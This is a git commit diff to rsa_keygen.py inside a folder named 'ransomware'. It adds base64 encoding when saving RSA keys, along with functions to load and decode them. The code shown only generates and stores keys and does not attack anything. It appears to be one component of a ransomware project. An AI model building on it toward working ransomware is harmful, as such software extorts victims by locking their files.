a8177233ade75f6f2603780f6f830d11d6bb69fb
lukkelele <encryptedluke@protonmail.com>
2022-05-14 10:54:44 +0200

    Updated rsa keygen

--- ransomware/rsa_keygen.py
+++ ransomware/rsa_keygen.py
@@ -11,17 +11,35 @@ def generate_keys(n):
     privkey, pubkey = key.export_key(), key.publickey().export_key()
     return privkey, pubkey
 
-
+# Save the keys encoded in b64
 def save_keys(privkey, pubkey, path="./"):
     for i in range(2):
         if i == 0:
-            key = privkey
+            key = encode_b64(privkey)
             keyname = 'private.pem'
         else:
-            key = pubkey
+            key = encode_b64(pubkey)
             keyname = 'public.pem'
         file = open(keyname, 'wb')
         file.write(key)
 
-privkey, pubkey = generate_keys(8)
-save_keys(privkey, pubkey)
+def load_keys(path="./", ext="pem"):
+    privkey = open(f"{path}private.{ext}", 'r').read()
+    pubkey = open(f"{path}public.{ext}", 'r').read()
+    decoded_privkey = decode_b64(privkey).decode()
+    decoded_pubkey = decode_b64(pubkey).decode()
+    return decoded_privkey, decoded_pubkey
+
+def encode_b64(obj):
+    return base64.b64encode(obj)
+
+def decode_b64(obj):
+    return base64.b64decode(obj)
+
+priv, pub = generate_keys(8)
+#save_keys(priv, pub)
+dcd_priv, dcd_pub = load_keys()
+
+
+
+
